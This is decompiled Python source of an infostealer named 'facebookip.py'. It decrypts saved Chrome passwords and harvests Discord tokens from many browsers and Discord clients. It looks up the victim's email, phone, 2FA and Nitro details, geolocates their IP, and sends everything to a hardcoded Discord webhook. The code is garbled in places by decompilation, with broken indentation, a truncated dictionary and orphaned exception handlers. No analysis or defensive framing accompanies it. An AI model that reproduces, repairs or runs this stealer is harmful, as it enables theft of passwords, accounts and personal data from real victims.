# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: facebookip.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import requests
import os
import json
import time
import os
import subprocess
from sys import executable
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
from zipfile import ZipFile
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES as AE
from shutil import copy2
from discord_webhook import *
from sys import argv
from PIL import ImageGrab
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import AES
from os import getlogin, listdir
from json import loads
from re import findall
from subprocess import Popen, PIPE
from datetime import datetime
webhook_url = 'https://discord.com/api/webhooks/1351649540125753495/F7CS_WaPIV5EOXvNhkSrZ9H5cOKSyMJ9Or852PqIkRJOb_RMOymxKz0c8LPt_vO1_JGZ'
ipget = requests.get('https://api.ipify.org')
ip = ipget.text
urlipget = f'http://ip-api.com/json/{ip}'
computer_name = os.environ['COMPUTERNAME']
ipcitysorgu = requests.get(urlipget)
if ipcitysorgu.status_code == 200:
    data = ipcitysorgu.json()
    query_ip = data.get('query', 'N/A')
    country = data.get('country', 'N/A')
    country_code = data.get('countryCode', 'N/A')
    region = data.get('region', 'N/A')
    region_name = data.get('regionName', 'N/A')
    city = data.get('city', 'N/A')
    zip_code = data.get('zip', 'N/A')
    lat = data.get('lat', 'N/A')
    lon = data.get('lon', 'N/A')
    timezone = data.get('timezone', 'N/A')
    isp = data.get('isp', 'N/A')
    org = data.get('org', 'N/A')
    as_info = data.get('as', 'N/A')
    as_name = data.get('asname', 'N/A')
    payload = {'content': ''.join(f'💻 **Computer Name: ** {computer_name}\n🔹 **IP: ** {query_ip}\n🏳️ **Country: ** {country} ({country_code})\n📍 **Region: ** {region} ({region_name})\n🏙️ **City: ** {city}\n📮 **ZIP Code: ** {zip_code}\n🗺️ **Latitude: ** {lat}\n🗺️ **Longitude: ** {lon}\n⏳ **Timezone: ** {timezone}\n🌍 **ISP: ** {isp}\n🏢 **Organization: ** {org}\n🛰️ **AS Info: ** {as_info} ({as_name})')}
local = os.getenv('LOCALAPPDATA')
google_paths = [local + '\\Google\\Chrome\\User Data\\Default', local + '\\Google\\Chrome\\User Data\\Profile 1', local + '\\Google\\Chrome\\User Data\\Profile 2', local + '\\Google\\Chrome\\User Data\\Profile 3', local + '\\Google\\Chrome\\User Data\\Profile 4', local + '\\Google\\Chrome\\User Data\\Profile 5']

def heck():
    def mk():
        with open(local + '\\Google\\Chrome\\User Data\\Local State', 'r', encoding='utf-8') as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    masterkey = mk()

    def decode_password(buffer, master_key):
        try:
            bufiv, payload = (buffer[3:15], buffer[15:])
            cipher = AE.new(master_key, AE.MODE_GCM, bufiv)
            decoded = cipher.decrypt(payload)[:(-16)].decode()
            return decoded
        except:
            return 'No Passwords Fount'

    def passwords():
        with open(f'\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt', 'w', encoding='utf-8') as f:
            f.write(' <-----    AFTIM  ----->\n\n')
        for path in google_paths:
            path += '\\Login Data'
            if not os.path.exists(path):
                continue
            copy2(path, 'logins.db')
            db = sqlite3.connect('logins.db')
            cmd = db.cursor()
            with open(f'\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt', 'a', encoding='utf-8') as f:
                for result in cmd.execute('SELECT action_url, username_value, password_value FROM logins'):
                    url, username, password = result
                    password = decode_password(password, masterkey)
                    if url and username and (password!= ''):
                        pass  # postinserted
                    else:  # inserted
                        username = 'N/A' if username is None else username
                        f.write('USER: {:<30} | PASS: {:<30} | URL: {:<30}\n'.format(username, password, url))
    passwords()
    gogleveri = DiscordWebhook(url=webhook_url, username='AFTIM')
    with open(local + '\\Google.txt', 'rb') as f:
        file_content = f.read()
        gogleveri.add_file(file=file_content, filename=f'Passwords-{computer_name}.txt')
        gogleveri.execute()
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return 'Error'

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Torch\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data', 'Chrome': chrome + 'Default', 'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data', '\\Microsoft\\Edge\\User Data\\Defaul': local + '\\uCozMedia\\Uran\\User Data\\Default', 'Uran': local + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Yandex': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Brave': local + '\\Iridium\\User Data\\Default', 'Iridium': local + 'Microsoft Edge', 'Uran': local + 'Uran', 'Yandex': local + 'Yandex', 'Brave': local +
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + '\\Local State', 'r') as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
                    for file in listdir(path + '\\Local Storage\\leveldb\\'):
                        if not file.endswith('.ldb') and file.endswith('.log'):
                            continue
                        try:
                            with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                                for x in files.readlines():
                                    x.strip()
                                    for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                                        tokens.append(values)
                    else:  # inserted
                        for i in tokens:
                            if i.endswith('\\'):
                                i.replace('\\', '')
                            else:  # inserted
                                if i not in cleaned:
                                    pass  # postinserted
                                else:  # inserted
                                    cleaned.append(i)
                        for token in cleaned:
                            pass  # postinserted
                        try:
                            tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                            checker.append(tok)
                            for value in checker:
                                if value not in already_check:
                                    already_check.append(value)
                                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                                    try:
                                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                                        if res.status_code == 200:
                                            res_json = res.json()
                                            ip = ipget.text
                                            pc_username = os.getenv('UserName')
                                            user_name = f"{res_json['username']}#{res_json['discriminator']}"
                                            user_id = res_json['id']
                                            email = res_json['email']
                                            phone = res_json['phone']
                                            mfa_enabled = res_json['mfa_enabled']
                                            has_nitro = False
                                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                                            nitro_data = res.json()
                                            has_nitro = bool(len(nitro_data) > 0)
                                            days_left = 0
                                            if has_nitro:
                                                d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                days_left = abs((d2 - d1).days)
                                            now = datetime.now()
                                            saat = now.strftime('%H:%M:%S')
                                            embed = f"# 💬 DISCORD 💬 \n **{user_name} - [ {saat} ]**\n-   **Account Information**\n**Email <a:saggok:1084596390434451507> ** `{email}`\n**Phone <a:saggok:1084596390434451507> ** `{phone}`\n**2FA/MFA Enabled <a:saggok:1084596390434451507> ** `{mfa_enabled}`\n**Nitro <a:saggok:1084596390434451507> ** `{has_nitro}`\n**Expires in <a:saggok:1084596390434451507> ** `{(days_left if days_left else 'None')} day(s)`\n-   **PC Information**\n**IP <a:saggok:1084596390434451507> ** `{ip}`\n**Username <a:saggok:1084596390434451507> ** `{pc_username}`\n**PC Name <a:saggok:1084596390434451507> ** `{computer_name}`\n**Platform <a:saggok:1084596390434451507> ** `{platform}`\n-   **Token** ↓ `{tok}`\n\n"
                                            payload = json.dumps({'content': embed})
                                            try:
                                                headers2 = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                                                req = Request(webhook_url, data=payload.encode(), headers=headers2)
                                                urlopen(req)
    except:
        pass  # postinserted
    continue
    except PermissionError:
        continue
    except IndexError == 'Error':
        continue
    except:
        pass  # postinserted
    continue
    except:
        pass  # postinserted
    pass
if __name__ == '__main__':
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 204:
        print('Successfully sent data!')
    get_token()
if __name__ == '__main__':
    heck()
    exe_dosyasi = 'dcboomer.exe'